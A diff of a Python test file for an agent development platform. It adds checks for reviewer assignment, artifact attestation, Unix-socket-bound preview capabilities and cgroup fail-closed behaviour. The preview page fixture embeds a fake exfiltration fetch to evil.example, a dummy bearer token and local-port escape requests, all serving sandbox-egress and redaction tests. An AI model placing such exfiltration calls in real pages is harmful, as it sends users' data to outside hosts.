@@ -284,12 +284,16 @@ def _seed_context_artifact(
     *,
     task_id: str,
     run_id: str,
-    payload: dict[str, Any],
+    payload: dict[str, Any] | None = None,
+    raw_bytes: bytes | None = None,
+    kind: str = "raw",
 ) -> tuple[str, bytes]:
-    """Persist a real agent.context_artifacts row for the reviewer run so R3-06 source attestation can verify it."""
+    """Persist a real agent.context_artifacts row so R3-06/R4-05/R4-06 source attestation can verify it."""
     import hashlib as _hashlib
 
-    raw_bytes = canonical_json(payload).encode("utf-8")
+    if raw_bytes is None:
+        assert payload is not None
+        raw_bytes = canonical_json(payload).encode("utf-8")
     digest = _hashlib.sha256(raw_bytes).hexdigest()
     art_id = uuid7()
     with dbs["owner"].tx() as c:
@@ -297,13 +301,14 @@ def _seed_context_artifact(
             "INSERT INTO agent.context_artifacts"
             " (tenant_id, id, task_id, run_id, owner_user_id, kind, content_sha256, byte_length,"
             "  nonce, ciphertext, key_id, expires_at)"
-            " VALUES (%s,%s,%s,%s,%s,'raw',%s,%s,%s,%s,'test-k1', now() + interval '1 hour')",
+            " VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,'test-k1', now() + interval '1 hour')",
             (
                 tenant["tenantId"],
                 art_id,
                 task_id,
                 run_id,
                 tenant["userId"],
+                kind,
                 digest,
                 len(raw_bytes),
                 b"\x01" * 12,
@@ -331,6 +336,8 @@ def test_phase7_projects_design_demo_reviews_and_owner_isolation(
         dbs["sentinel"].one("SELECT id FROM agent.dev_preview_instances LIMIT 1")
     with pytest.raises(InsufficientPrivilege):
         dbs["relay"].one("SELECT id FROM agent.dev_review_artifacts LIMIT 1")
+    with pytest.raises(InsufficientPrivilege):
+        dbs["sentinel"].one("SELECT id FROM agent.dev_review_assignments LIMIT 1")
     with pytest.raises(InsufficientPrivilege):
         dbs["sentinel"].one("SELECT id FROM agent.dev_demo_artifacts LIMIT 1")
 
@@ -432,8 +439,107 @@ def test_phase7_projects_design_demo_reviews_and_owner_isolation(
         indep = commands.submit_task(
             dbs["api"], Scope(tenant["tenantId"], tenant["userId"], tenant["workspaceId"]), "indep-review"
         )
+        # R4-06: Self-review assignment MUST be rejected, and unassigned reviewer artifacts MUST be rejected!
+        with pytest.raises(ScopeDenied, match="SELF_REVIEW_ASSIGNMENT_FORBIDDEN"):
+            dev_store.assign_reviewer(
+                tenant_id=tenant["tenantId"],
+                owner_user_id=tenant["userId"],
+                project_id=proj_id,
+                cycle_id=cycle_id,
+                reviewer_task_id=claim.task_id,
+                reviewer_run_id=claim.run_id,
+                reviewer_role="security",
+                target_sha=commit_sha,
+            )
+
+        good_payload = {
+            "purpose": "independent_code_review",
+            "projectId": proj_id,
+            "cycleId": cycle_id,
+            "reviewerRole": "security",
+            "targetSha": commit_sha,
+            "passed": True,
+            "findings": [{"findingId": "f1", "severity": "P2", "status": "RESOLVED"}],
+            "summary": "resolved finding",
+        }
+        good_src_id, good_raw = _seed_context_artifact(
+            dbs, tenant, task_id=indep["taskId"], run_id=indep["runId"], payload=good_payload
+        )
+        # Unassigned reviewer run MUST fail closed (REVIEWER_ASSIGNMENT_MISMATCH)!
+        with pytest.raises(ScopeDenied, match="REVIEWER_ASSIGNMENT_MISMATCH"):
+            dev_store.record_review_artifact(
+                tenant_id=tenant["tenantId"],
+                owner_user_id=tenant["userId"],
+                project_id=proj_id,
+                cycle_id=cycle_id,
+                task_id=indep["taskId"],
+                run_id=indep["runId"],
+                source_artifact_id=good_src_id,
+                evidence_payload=good_raw,
+            )
+
+        # Authoritatively assign indep task/run as `security` reviewer for this cycle + commit_sha (kind='raw')
+        asg_id = dev_store.assign_reviewer(
+            tenant_id=tenant["tenantId"],
+            owner_user_id=tenant["userId"],
+            project_id=proj_id,
+            cycle_id=cycle_id,
+            reviewer_task_id=indep["taskId"],
+            reviewer_run_id=indep["runId"],
+            reviewer_role="security",
+            target_sha=commit_sha,
+            expected_artifact_kind="raw",
+        )
+
+        # R4-06: Missing purpose, role mismatch, or wrong context_artifact kind ('summary' vs 'raw') MUST fail!
+        no_purpose_payload = {k: v for k, v in good_payload.items() if k != "purpose"}
+        no_purpose_id, no_purpose_raw = _seed_context_artifact(
+            dbs, tenant, task_id=indep["taskId"], run_id=indep["runId"], payload=no_purpose_payload
+        )
+        with pytest.raises(InvalidEvidence, match="purpose='independent_code_review'"):
+            dev_store.record_review_artifact(
+                tenant_id=tenant["tenantId"],
+                owner_user_id=tenant["userId"],
+                project_id=proj_id,
+                cycle_id=cycle_id,
+                task_id=indep["taskId"],
+                run_id=indep["runId"],
+                source_artifact_id=no_purpose_id,
+                evidence_payload=no_purpose_raw,
+            )
+        wrong_role_payload = {**good_payload, "reviewerRole": "functional"}
+        wrong_role_id, wrong_role_raw = _seed_context_artifact(
+            dbs, tenant, task_id=indep["taskId"], run_id=indep["runId"], payload=wrong_role_payload
+        )
+        with pytest.raises(ScopeDenied, match="REVIEWER_ASSIGNMENT_MISMATCH"):
+            dev_store.record_review_artifact(
+                tenant_id=tenant["tenantId"],
+                owner_user_id=tenant["userId"],
+                project_id=proj_id,
+                cycle_id=cycle_id,
+                task_id=indep["taskId"],
+                run_id=indep["runId"],
+                source_artifact_id=wrong_role_id,
+                evidence_payload=wrong_role_raw,
+            )
+        summary_kind_id, summary_kind_raw = _seed_context_artifact(
+            dbs, tenant, task_id=indep["taskId"], run_id=indep["runId"], payload=good_payload, kind="summary"
+        )
+        with pytest.raises(ScopeDenied, match="SOURCE_ARTIFACT_MISMATCH"):
+            dev_store.record_review_artifact(
+                tenant_id=tenant["tenantId"],
+                owner_user_id=tenant["userId"],
+                project_id=proj_id,
+                cycle_id=cycle_id,
+                task_id=indep["taskId"],
+                run_id=indep["runId"],
+                source_artifact_id=summary_kind_id,
+                evidence_payload=summary_kind_raw,
+            )
+
         # R3-06: Cannot record passed=True with an OPEN P0/P1 finding (payload itself drives verdict fields)
         bad_payload = {
+            "purpose": "independent_code_review",
             "reviewerRole": "security",
             "targetSha": commit_sha,
             "passed": True,
@@ -455,16 +561,6 @@ def test_phase7_projects_design_demo_reviews_and_owner_isolation(
                 evidence_payload=bad_raw,
             )
 
-        good_payload = {
-            "reviewerRole": "security",
-            "targetSha": commit_sha,
-            "passed": True,
-            "findings": [{"findingId": "f1", "severity": "P2", "status": "RESOLVED"}],
-            "summary": "resolved finding",
-        }
-        good_src_id, good_raw = _seed_context_artifact(
-            dbs, tenant, task_id=indep["taskId"], run_id=indep["runId"], payload=good_payload
-        )
         # R3-06: Tampering payload bytes vs persisted context_artifacts MUST be rejected (SOURCE_ARTIFACT_MISMATCH)!
         with pytest.raises(ScopeDenied, match="SOURCE_ARTIFACT_MISMATCH"):
             dev_store.record_review_artifact(
@@ -528,6 +624,20 @@ def test_phase7_projects_design_demo_reviews_and_owner_isolation(
         assert reconstructed.findings == (ReviewFinding("f1", "P2", "RESOLVED"),)
         attest.assert_verified(proj_scope, builder_fence, reconstructed, cycle_id=cycle_id)
 
+        # R4-06: Revoking the reviewer assignment MUST immediately fail attestation!
+        with dbs["owner"].tx() as c:
+            c.execute(
+                "UPDATE agent.dev_review_assignments SET status='REVOKED' WHERE tenant_id=%s AND id=%s",
+                (tenant["tenantId"], asg_id),
+            )
+        with pytest.raises(ScopeDenied, match="assignment/purpose mismatch"):
+            attest.load_verified_verdict(proj_scope, builder_fence, cycle_id=cycle_id, artifact_id=art_id)
+        with dbs["owner"].tx() as c:
+            c.execute(
+                "UPDATE agent.dev_review_assignments SET status='COMPLETED' WHERE tenant_id=%s AND id=%s",
+                (tenant["tenantId"], asg_id),
+            )
+
         # Design Picker + Demo approval with REAL rendered artifact (R3-08) + live goal_revision check (P1-06 + R2-11)
         r_des = client.post(
             f"/v1/development/cycles/{cycle_id}/design",
@@ -589,7 +699,39 @@ def test_phase7_projects_design_demo_reviews_and_owner_isolation(
         )
         assert r_demo_unrendered.status_code == 422 and "RENDERED_DEMO_ARTIFACT_REQUIRED" in r_demo_unrendered.text
 
-        # Now persist real rendered Demo artifacts for minimal & dense -> Demo APPROVED succeeds with verified digest!
+        # R4-05: Persist real raw Demo render bytes in canonical `agent.context_artifacts` and bind via source_artifact_id!
+        min_bytes = b"<html><body>Minimal Rendered Demo v1</body></html>"
+        dense_bytes = b"<html><body>Dense Rendered Demo v1</body></html>"
+        min_ctx_art_id, _ = _seed_context_artifact(
+            dbs, tenant, task_id=claim.task_id, run_id=claim.run_id, raw_bytes=min_bytes, kind="raw"
+        )
+        dense_ctx_art_id, _ = _seed_context_artifact(
+            dbs, tenant, task_id=claim.task_id, run_id=claim.run_id, raw_bytes=dense_bytes, kind="raw"
+        )
+        # Non-existent or mismatched context_artifacts backing MUST fail closed!
+        with pytest.raises(ScopeDenied, match="DEMO_SOURCE_ARTIFACT_MISMATCH"):
+            dev_store.record_demo_render_artifact(
+                tenant_id=tenant["tenantId"],
+                owner_user_id=tenant["userId"],
+                cycle_id=cycle_id,
+                candidate_id="minimal",
+                viewport="1280x800",
+                fixture_ref="fixture://dash-1",
+                source_artifact_id=min_ctx_art_id,
+                render_bytes=b"<html><body>TAMPERED BYTES</body></html>",
+            )
+        with pytest.raises(ScopeDenied, match="DEMO_SOURCE_ARTIFACT_MISMATCH"):
+            dev_store.record_demo_render_artifact(
+                tenant_id=tenant["tenantId"],
+                owner_user_id=tenant["userId"],
+                cycle_id=cycle_id,
+                candidate_id="minimal",
+                viewport="1280x800",
+                fixture_ref="fixture://dash-1",
+                source_artifact_id=uuid7(),
+                render_bytes=min_bytes,
+            )
+
         render_min = dev_store.record_demo_render_artifact(
             tenant_id=tenant["tenantId"],
             owner_user_id=tenant["userId"],
@@ -597,8 +739,10 @@ def test_phase7_projects_design_demo_reviews_and_owner_isolation(
             candidate_id="minimal",
             viewport="1280x800",
             fixture_ref="fixture://dash-1",
-            render_bytes=b"<html><body>Minimal Rendered Demo v1</body></html>",
+            source_artifact_id=min_ctx_art_id,
+            render_bytes=min_bytes,
         )
+        assert render_min["sourceArtifactId"] == min_ctx_art_id
         render_dense = dev_store.record_demo_render_artifact(
             tenant_id=tenant["tenantId"],
             owner_user_id=tenant["userId"],
@@ -606,7 +750,8 @@ def test_phase7_projects_design_demo_reviews_and_owner_isolation(
             candidate_id="dense",
             viewport="1280x800",
             fixture_ref="fixture://dash-1",
-            render_bytes=b"<html><body>Dense Rendered Demo v1</body></html>",
+            source_artifact_id=dense_ctx_art_id,
+            render_bytes=dense_bytes,
         )
         r_sel = client.post(
             f"/v1/development/cycles/{cycle_id}/design-decision",
@@ -621,6 +766,25 @@ def test_phase7_projects_design_demo_reviews_and_owner_isolation(
         digest_minimal = r_sel.json()["design"]["demoSnapshotDigest"]
         assert r_sel.json()["design"]["demoRenderArtifactId"] == render_min["id"]
         assert r_sel.json()["design"]["demoArtifactSha256"] == render_min["contentSha256"]
+        assert r_sel.json()["design"]["demoArtifactRef"] == f"context-artifact://{min_ctx_art_id}"
+
+        # R4-05: Revoking the backing context_artifacts entry blocks Demo APPROVED fail-closed!
+        with dbs["owner"].tx() as c:
+            c.execute(
+                "UPDATE agent.context_artifacts SET revoked_at=now(), ciphertext=NULL WHERE tenant_id=%s AND id=%s",
+                (tenant["tenantId"], min_ctx_art_id),
+            )
+        r_demo_revoked_art = client.post(
+            f"/v1/development/cycles/{cycle_id}/demo-decision",
+            headers=h_a,
+            json={"designRevision": 1, "decision": "APPROVED", "demoSnapshotDigest": digest_minimal},
+        )
+        assert r_demo_revoked_art.status_code == 409 and "RENDERED_DEMO_ARTIFACT_MISMATCH" in r_demo_revoked_art.text
+        with dbs["owner"].tx() as c:
+            c.execute(
+                "UPDATE agent.context_artifacts SET revoked_at=NULL, ciphertext=%s WHERE tenant_id=%s AND id=%s",
+                (min_bytes + b"\x00" * 16, tenant["tenantId"], min_ctx_art_id),
+            )
 
         r_demo = client.post(
             f"/v1/development/cycles/{cycle_id}/demo-decision",
@@ -665,8 +829,10 @@ def test_phase7_projects_design_demo_reviews_and_owner_isolation(
 def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
     pg: Any, dbs: dict[str, Database], tenant: dict[str, str], tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
-    """DEV-06 + R3-02 + R3-04 + R3-05: Dedicated PreviewCapability via ToolGateway -> Sandbox Cell, cgroup v2, single-use nonce & monotonic generation."""
+    """DEV-06 + R3-02..R3-05 + R4-02..R4-04: Instance-bound Unix socket (ino+SO_PEERCRED), cgroup fork barrier, DB-authoritative task/run/scope/watcher."""
     pytest.importorskip("playwright.async_api")
+    from aiagent_development.browser_debugger import run_sandbox_cell_preview_debug_async
+    from aiagent_development.pg_store import format_preview_unix_endpoint_ref
     from aiagent_sandbox.grant import GrantError, PreviewCapability, sign_preview_capability, verify_preview_capability
     from aiagent_sandbox.supervisor import Supervisor, _BrowserCgroup
     from aiagent_sandbox.supervisor import serve as serve_sandbox
@@ -687,42 +853,75 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
     threading.Thread(target=escape_srv.serve_forever, daemon=True).start()
     escape_port = escape_srv.server_address[1]
 
-    class _PreviewHandler(BaseHTTPRequestHandler):
-        def log_message(self, fmt: str, *args: Any) -> None:
-            del fmt, args
+    # R4-03: Preview Runner serves HTTP strictly over an instance-owned AF_UNIX socket (NEVER raw TCP port!)
+    srv_port = _free_tcp_port()
+    preview_sock_path = Path("/tmp") / f"aiag-test-prv-{secrets.token_hex(6)}.sock"  # noqa: S108
+    if preview_sock_path.exists():
+        preview_sock_path.unlink()
 
-        def do_GET(self) -> None:
-            if self.path == "/api/broken":
-                self.send_response(500)
-                self.send_header("Content-Type", "application/json")
-                self.end_headers()
-                self.wfile.write(b'{"error":"boom"}')
-                return
-            if self.path == "/redirect-escape":
-                self.send_response(302)
-                self.send_header("Location", f"http://127.0.0.1:{escape_port}/escaped")
-                self.end_headers()
-                return
-            html = (
-                "<!doctype html><html><body style='margin:0'>"
-                "<div style='width:900px;height:40px'>Wide mobile overflow</div>"
-                "<iframe src='/redirect-escape'></iframe>"
-                "<script>"
-                "console.error('Auth failed Bearer super_secret_token_999 ws://127.0.0.1:9222/devtools/page/abc');"
-                "fetch('/api/broken');"
-                "fetch('http://evil.example/steal').catch(() => {});"
-                f"fetch('http://127.0.0.1:{escape_port}/direct-port-escape').catch(() => {{}});"
-                "</script></body></html>"
-            ).encode()
-            self.send_response(200)
-            self.send_header("Content-Type", "text/html; charset=utf-8")
-            self.send_header("Content-Length", str(len(html)))
-            self.end_headers()
-            self.wfile.write(html)
+    async def _preview_unix_http(r: asyncio.StreamReader, w: asyncio.StreamWriter) -> None:
+        try:
+            head = await asyncio.wait_for(r.readuntil(b"\r\n\r\n"), timeout=5.0)
+            first = head.decode("latin-1").split("\r\n", 1)[0]
+            parts = first.split(" ")
+            req_path = parts[1] if len(parts) >= 2 else "/"
+            if req_path == "/api/broken":
+                body = b'{"error":"boom"}'
+                w.write(
+                    b"HTTP/1.1 500 Internal Server Error\r\nContent-Type: application/json\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s"
+                    % (len(body), body)
+                )
+            elif req_path == "/redirect-escape":
+                w.write(
+                    (
+                        f"HTTP/1.1 302 Found\r\nLocation: http://127.0.0.1:{escape_port}/escaped\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
+                    ).encode("latin-1")
+                )
+            elif req_path == "/slow":
+                await asyncio.sleep(2.5)
+                body = b"<!doctype html><html><body>slow</body></html>"
+                w.write(
+                    b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s"
+                    % (len(body), body)
+                )
+            else:
+                html = (
+                    "<!doctype html><html><body style='margin:0'>"
+                    "<div style='width:900px;height:40px'>Wide mobile overflow</div>"
+                    "<iframe src='/redirect-escape'></iframe>"
+                    "<script>"
+                    "console.error('Auth failed Bearer super_secret_token_999 ws://127.0.0.1:9222/devtools/page/abc');"
+                    "fetch('/api/broken');"
+                    "fetch('http://evil.example/steal').catch(() => {});"
+                    f"fetch('http://127.0.0.1:{escape_port}/direct-port-escape').catch(() => {{}});"
+                    "</script></body></html>"
+                ).encode()
+                w.write(
+                    b"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s"
+                    % (len(html), html)
+                )
+            await w.drain()
+        except (OSError, TimeoutError, asyncio.IncompleteReadError):
+            pass
+        finally:
+            w.close()
 
-    srv = ThreadingHTTPServer(("127.0.0.1", 0), _PreviewHandler)
-    threading.Thread(target=srv.serve_forever, daemon=True).start()
-    srv_port = srv.server_address[1]
+    async def _boot_preview_unix(holder: dict[str, Any]) -> None:
+        unix_srv = await asyncio.start_unix_server(_preview_unix_http, path=str(preview_sock_path))
+        os.chmod(preview_sock_path, 0o600)
+        holder["ino"] = os.lstat(preview_sock_path).st_ino
+
+        async def _cleanup() -> None:
+            unix_srv.close()
+            await unix_srv.wait_closed()
+            preview_sock_path.unlink(missing_ok=True)
+
+        holder["cleanup"] = _cleanup
+
+    prv_h, prv_loop, prv_th = _start_async_service(_boot_preview_unix)
+    preview_ino = int(prv_h["ino"])
+    preview_pid = os.getpid()
+    preview_ep_ref = format_preview_unix_endpoint_ref(str(preview_sock_path), inode=preview_ino, pid=preview_pid)
 
     # R3-02: Separate preview_capability_key from sandbox_grant_key; reusing the same key MUST fail closed!
     sb_port = _free_tcp_port()
@@ -735,8 +934,8 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
     with pytest.raises(RuntimeError, match="distinct from grant_key"):
         Supervisor(tmp_path / "bad_sup", sb_grant_key, preview_capability_key=sb_grant_key)
 
-    # R3-02: PreviewCapability binds target_port/target_url/commit_sha/instance_generation; tampering fails signature!
-    sample_cap = PreviewCapability(
+    # R3-02 + R4-03: PreviewCapability binds instance Unix socket (ino+pid); raw TCP port endpoint_ref MUST be rejected!
+    raw_tcp_cap = PreviewCapability(
         capability_id=f"prvcap-{secrets.token_hex(12)}",
         tenant_id=tenant["tenantId"],
         owner_user_id=tenant["userId"],
@@ -757,6 +956,32 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
         pids_max=256,
         cpu_quota_us=100_000,
         expires=int(time.time()) + 30,
+        attempt_id="dbg-bad-tcp",
+    )
+    with pytest.raises(GrantError, match="PREVIEW_CAP_ENDPOINT_MISMATCH"):
+        verify_preview_capability(preview_cap_key, sign_preview_capability(preview_cap_key, raw_tcp_cap))
+
+    sample_cap = PreviewCapability(
+        capability_id=f"prvcap-{secrets.token_hex(12)}",
+        tenant_id=tenant["tenantId"],
+        owner_user_id=tenant["userId"],
+        project_id="proj-dbg-1",
+        cycle_id="cyc-1",
+        workspace_id=tenant["workspaceId"],
+        task_id=uuid7(),
+        run_id=uuid7(),
+        lease_id=uuid7(),
+        preview_instance_id=uuid7(),
+        instance_generation=2,
+        target_port=srv_port,
+        target_url=f"http://127.0.0.1:{srv_port}/",
+        endpoint_ref=preview_ep_ref,
+        commit_sha="2" * 40,
+        wall_ms=15_000,
+        memory_bytes=2 * 1024 * 1024 * 1024,
+        pids_max=256,
+        cpu_quota_us=100_000,
+        expires=int(time.time()) + 30,
         attempt_id="dbg-sample",
     )
     signed_sample = sign_preview_capability(preview_cap_key, sample_cap)
@@ -769,7 +994,39 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
     with pytest.raises(GrantError, match="PREVIEW_CAP_BAD_SIGNATURE"):
         verify_preview_capability(preview_cap_key, tampered_port)
 
-    # R3-04: Verify _BrowserCgroup writes memory.max, pids.max, cpu.max & require_browser_cgroup=True fails closed!
+    # R4-03: Wrong inode in endpoint_ref MUST fail closed BEFORE launching any browser cell!
+    wrong_ino_sup = Supervisor(
+        tmp_path / "wrong_ino_cells",
+        sb_grant_key,
+        preview_capability_key=preview_cap_key,
+        require_browser_cgroup=False,
+    )
+    wrong_ino_cap = PreviewCapability(
+        **{
+            **sample_cap.payload(),
+            "capability_id": f"prvcap-{secrets.token_hex(12)}",
+            "endpoint_ref": format_preview_unix_endpoint_ref(
+                str(preview_sock_path), inode=preview_ino + 999999, pid=preview_pid
+            ),
+        }
+    )
+    with pytest.raises(GrantError, match="PREVIEW_ENDPOINT_UNVERIFIED"):
+        _run(wrong_ino_sup.debug_preview(sign_preview_capability(preview_cap_key, wrong_ino_cap)))
+
+    # R4-03: Wrong PID (SO_PEERCRED mismatch) MUST close bridge without serving page!
+    wrong_pid_cap = PreviewCapability(
+        **{
+            **sample_cap.payload(),
+            "capability_id": f"prvcap-{secrets.token_hex(12)}",
+            "endpoint_ref": format_preview_unix_endpoint_ref(
+                str(preview_sock_path), inode=preview_ino, pid=preview_pid + 12345
+            ),
+        }
+    )
+    wrong_pid_res = _run(wrong_ino_sup.debug_preview(sign_preview_capability(preview_cap_key, wrong_pid_cap)))
+    assert wrong_pid_res["status"] == "EXITED" and wrong_pid_res["exitCode"] != 0
+
+    # R3-04 + R4-02: Verify _BrowserCgroup writes memory.max/pids.max/cpu.max, AND cgroup attach failure aborts BEFORE fork!
     fake_cg_root = tmp_path / "fake_cgroup"
     fake_cg_root.mkdir()
     cg = _BrowserCgroup.create(
@@ -785,11 +1042,39 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
     assert (cg.path / "cpu.max").read_text().strip() == "80000 100000"
     assert cg.attach(os.getpid()) is True
     assert (cg.path / "cgroup.procs").read_text().strip() == str(os.getpid())
-    # Real kernel cgroupfs auto-removes virtual control files on rmdir; remove fake regular files in tmp_path first.
     for ctrl in ("memory.max", "pids.max", "cpu.max", "cgroup.procs"):
         (cg.path / ctrl).unlink(missing_ok=True)
     cg.cleanup()
     assert not cg.path.exists()
+
+    # R4-02: When cgroup.attach fails under require_browser_cgroup=True, start barrier is NEVER released (child never forks)!
+    attach_fail_root = tmp_path / "attach_fail_cg"
+    attach_fail_root.mkdir()
+    attach_fail_sup = Supervisor(
+        tmp_path / "attach_fail_cells",
+        sb_grant_key,
+        preview_capability_key=preview_cap_key,
+        require_browser_cgroup=True,
+        cgroup_root=attach_fail_root,
+    )
+    orig_attach = _BrowserCgroup.attach
+    attach_calls: list[int] = []
+
+    def _fail_attach(self_cg: _BrowserCgroup, pid: int) -> bool:
+        del self_cg
+        attach_calls.append(pid)
+        return False
+
+    monkeypatch.setattr(_BrowserCgroup, "attach", _fail_attach)
+    try:
+        attach_fail_cap = PreviewCapability(
+            **{**sample_cap.payload(), "capability_id": f"prvcap-{secrets.token_hex(12)}"}
+        )
+        with pytest.raises(GrantError, match="BROWSER_CGROUP_ATTACH_FAILED"):
+            _run(attach_fail_sup.debug_preview(sign_preview_capability(preview_cap_key, attach_fail_cap)))
+        assert len(attach_calls) == 1
+    finally:
+        monkeypatch.setattr(_BrowserCgroup, "attach", orig_attach)
 
     strict_sup = Supervisor(
         tmp_path / "strict_cg_cells",
@@ -798,7 +1083,6 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
         require_browser_cgroup=True,
         cgroup_root=tmp_path / "nonexistent_ro_parent" / "nested",
     )
-    # Force unreadable parent so _BrowserCgroup.create fails -> strict_sup MUST fail closed with BROWSER_CGROUP_REQUIRED!
     (tmp_path / "nonexistent_ro_parent").mkdir()
     os.chmod(tmp_path / "nonexistent_ro_parent", 0o500)
     try:
@@ -866,7 +1150,7 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
                 json={"projectId": "proj-dbg-1", "name": "Debug App", "repository": "org/dbg-app"},
             )
             assert r_p.status_code == 201
-            cycle_a, sha_a, _, _, cycle_a_obj = _seed_code_ready_cycle(
+            cycle_a, sha_a, created_a, _, cycle_a_obj = _seed_code_ready_cycle(
                 dbs, tenant, project_id="proj-dbg-1", repository="org/dbg-app"
             )
             cycle_b, _, _, _, _ = _seed_code_ready_cycle(
@@ -874,14 +1158,26 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
             )
 
             broker = PreviewBroker(dbs["api"])
-            proc_sha = sha256_hex({"cycle": cycle_a, "port": srv_port})
+            proc_sha = sha256_hex({"cycle": cycle_a, "endpoint": preview_ep_ref})
             now_s = int(time.time())
 
-            # R3-05: Forged HMAC & expired launch receipts MUST be rejected!
+            # R3-05 + R4-03: Raw TCP endpoint_ref, forged HMAC, & expired launch receipts MUST be rejected!
+            with pytest.raises(ScopeDenied, match="INVALID_PREVIEW_ENDPOINT_REF"):
+                broker.register_instance(
+                    cycle_a_obj,
+                    target_port=srv_port,
+                    endpoint_ref=f"sandbox-cell://127.0.0.1:{srv_port}",
+                    process_attestation_sha256=proc_sha,
+                    launch_receipt_hmac="f" * 64,
+                    launch_nonce=f"nonce-badtcp-{secrets.token_hex(8)}",
+                    issued_at_epoch=now_s,
+                    expires_at_epoch=now_s + 30,
+                )
             with pytest.raises(ScopeDenied, match="INVALID_PREVIEW_LAUNCH_RECEIPT"):
                 broker.register_instance(
                     cycle_a_obj,
                     target_port=srv_port,
+                    endpoint_ref=preview_ep_ref,
                     process_attestation_sha256=proc_sha,
                     launch_receipt_hmac="f" * 64,
                     launch_nonce=f"nonce-forged-{secrets.token_hex(8)}",
@@ -898,6 +1194,7 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
                 workspace_id=tenant["workspaceId"],
                 commit_sha=sha_a,
                 target_port=srv_port,
+                endpoint_ref=preview_ep_ref,
                 runner_kind="sandbox_cell",
                 process_attestation_sha256=proc_sha,
                 generation=1,
@@ -909,6 +1206,7 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
                 broker.register_instance(
                     cycle_a_obj,
                     target_port=srv_port,
+                    endpoint_ref=preview_ep_ref,
                     process_attestation_sha256=proc_sha,
                     launch_receipt_hmac=rcpt_exp,
                     launch_nonce=expired_nonce,
@@ -917,7 +1215,7 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
                     generation=1,
                 )
 
-            # Register generation 1 with valid short-lived single-use HMAC launch receipt
+            # Register generation 1 with valid short-lived single-use HMAC launch receipt bound to Unix socket (ino+pid)
             nonce_g1 = f"nonce-g1-{secrets.token_hex(10)}"
             rcpt_g1 = sign_preview_launch_receipt(
                 attest_key,
@@ -928,6 +1226,7 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
                 workspace_id=tenant["workspaceId"],
                 commit_sha=sha_a,
                 target_port=srv_port,
+                endpoint_ref=preview_ep_ref,
                 runner_kind="sandbox_cell",
                 process_attestation_sha256=proc_sha,
                 generation=1,
@@ -938,6 +1237,7 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
             inst_g1 = broker.register_instance(
                 cycle_a_obj,
                 target_port=srv_port,
+                endpoint_ref=preview_ep_ref,
                 process_attestation_sha256=proc_sha,
                 launch_receipt_hmac=rcpt_g1,
                 launch_nonce=nonce_g1,
@@ -951,6 +1251,7 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
                 broker.register_instance(
                     cycle_a_obj,
                     target_port=srv_port,
+                    endpoint_ref=preview_ep_ref,
                     process_attestation_sha256=proc_sha,
                     launch_receipt_hmac=rcpt_g1,
                     launch_nonce=nonce_g1,
@@ -967,6 +1268,7 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
                 workspace_id=tenant["workspaceId"],
                 commit_sha=sha_a,
                 target_port=srv_port,
+                endpoint_ref=preview_ep_ref,
                 runner_kind="sandbox_cell",
                 process_attestation_sha256=proc_sha,
                 generation=2,
@@ -978,6 +1280,7 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
                 broker.register_instance(
                     cycle_a_obj,
                     target_port=srv_port,
+                    endpoint_ref=preview_ep_ref,
                     process_attestation_sha256=proc_sha,
                     launch_receipt_hmac=rcpt_replay_nonce,
                     launch_nonce=nonce_g1,
@@ -1008,6 +1311,7 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
                 dbs, other, project_id="proj-other-port", repository="org/other-port"
             )
             nonce_other = f"nonce-other-{secrets.token_hex(10)}"
+            other_ep_ref = format_preview_unix_endpoint_ref("/tmp/other-tenant-prv.sock", inode=55555, pid=preview_pid)
             rcpt_other = sign_preview_launch_receipt(
                 attest_key,
                 tenant_id=other["tenantId"],
@@ -1017,6 +1321,7 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
                 workspace_id=other["workspaceId"],
                 commit_sha=sha_o,
                 target_port=srv_port,
+                endpoint_ref=other_ep_ref,
                 runner_kind="sandbox_cell",
                 process_attestation_sha256=proc_sha,
                 generation=1,
@@ -1028,6 +1333,7 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
                 broker.register_instance(
                     cyc_o_obj,
                     target_port=srv_port,
+                    endpoint_ref=other_ep_ref,
                     process_attestation_sha256=proc_sha,
                     launch_receipt_hmac=rcpt_other,
                     launch_nonce=nonce_other,
@@ -1047,6 +1353,7 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
                 workspace_id=tenant["workspaceId"],
                 commit_sha=sha_a,
                 target_port=srv_port,
+                endpoint_ref=preview_ep_ref,
                 runner_kind="sandbox_cell",
                 process_attestation_sha256=proc_sha,
                 generation=2,
@@ -1057,6 +1364,7 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
             inst_g2 = broker.register_instance(
                 cycle_a_obj,
                 target_port=srv_port,
+                endpoint_ref=preview_ep_ref,
                 process_attestation_sha256=proc_sha,
                 launch_receipt_hmac=rcpt_g2,
                 launch_nonce=nonce_g2,
@@ -1107,6 +1415,65 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
             monkeypatch.setenv("AIAGENT_SANDBOX_RPC_KEY", sb_rpc_key.hex())
